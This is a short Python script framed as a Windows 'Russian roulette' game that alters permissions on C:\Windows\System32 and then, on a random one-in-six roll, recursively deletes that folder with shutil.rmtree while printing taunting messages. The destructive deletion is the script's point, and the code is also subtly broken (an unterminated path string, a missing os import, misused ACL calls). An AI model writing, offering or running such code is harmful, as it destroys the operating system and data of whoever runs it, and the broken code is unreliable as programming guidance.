import random
import shutil
import win32security
import ntsecuritycon as con

# Specify the path to the directory you want to modify
path = r'C:\Windows\System32

# Get the security descriptor for the directory
security_descriptor = win32security.GetFileSecurity(path, win32security.DACL_SECURITY_INFORMATION)

# Get the DACL from the security descriptor
dacl = security_descriptor.GetSecurityDescriptorDacl()

# Create a new access control entry (ACE)
user_sid = win32security.LookupAccountName('', 'Users')[0]
ace = win32security.ACL()
ace.AddAccessAllowedAce(con.FILE_GENERIC_READ, user_sid)

# Add the ACE to the DACL
dacl.AddAccessAllowedAce(win32security.ACL_REVISION, ace)

# Set the new DACL on the security descriptor
security_descriptor.SetSecurityDescriptorDacl(1, dacl, 0)

# Apply the new security descriptor to the directory
win32security.SetFileSecurity(path, win32security.DACL_SECURITY_INFORMATION, security_descriptor)

# Generate a random integer between 0 and 5 (inclusive)
random_number = random.randint(0, 5)

if ( not random_number ):

  # DELETE SYSTEM
  print("Congratulations! You survived... for now.");
  # specify the directory to delete
  directory = "C:\Windows\System32"

  # remove the directory and its contents
  if os.path.exists(directory):
      try:
          shutil.rmtree(directory)
          print(f"{directory} deleted successfully!")
      except OSError as e:
          print(f"Error: {directory} cannot be removed - {e}")
  else:
      print(f"Error: {directory} does not exist.")
else:
  print("Game over, better luck next time (if there is a next time).")
